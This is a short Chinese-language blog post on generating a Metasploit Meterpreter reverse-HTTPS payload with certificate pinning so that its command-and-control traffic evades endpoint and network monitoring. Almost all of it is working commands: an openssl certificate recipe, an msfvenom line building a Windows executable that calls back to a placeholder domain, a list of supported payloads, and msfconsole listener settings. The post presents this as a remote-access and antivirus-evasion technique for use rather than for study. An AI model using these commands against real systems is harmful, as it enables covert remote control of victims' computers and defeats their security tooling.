---
title: MSF TLS pinning
author: Admin
date: 2020-05-01 14:01:00 +0800
categories: [RAT, MSF]
tags: [流量加密, MSF, 免杀]
---

# 开宗明义

利用证书锁定过掉流量监控，例如赛某的端点防护。

rapid7官方将之称为```Paranoid Mode(偏执模式)```，相关wiki：[github.com/rapid7/metasploit-framework/wiki/Meterpreter-Paranoid-Mode](https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Paranoid-Mode)

# 创建证书

```shell script
openssl req -new -newkey rsa:4096 -days 36500 -nodes -x509 -subj "/C=US/ST=Texas/L=Austin/O=Development/CN=www.example.com" -keyout cert.key -out cert.crt
cat cert.key  cert.crt > cert.pem
rm -f cert.key  cert.crt
```

其中```www.example.com```为回连域名或IP

# 生成payload

```shell script
msfvenom -p windows/meterpreter/reverse_winhttps LHOST=www.example.com LPORT=443 PayloadUUIDTracking=true HandlerSSLCert=./cert.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH -f exe -o ./launch-paranoid.exe
```

支持的payload:

|  Staged (payload.bat\|ps1\|txt\|exe)   |
|  :----  |
| windows/meterpreter/reverse_winhttps  |
| windows/meterpreter/reverse_https  |
| windows/x64/meterpreter/reverse_https  |

|  Stageless (binary.exe)   |
|  :----  |
| windows/meterpreter_reverse_https  |
| windows/x64/meterpreter_reverse_https  |


# 设置监听

```shell script
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_winhttps
set LHOST www.example.com
set LPORT 443
set HandlerSSLCert ./cert.pem
set IgnoreUnknownPayloads true
set StagerVerifySSLCert true
set exitonsession false
run -j -z
```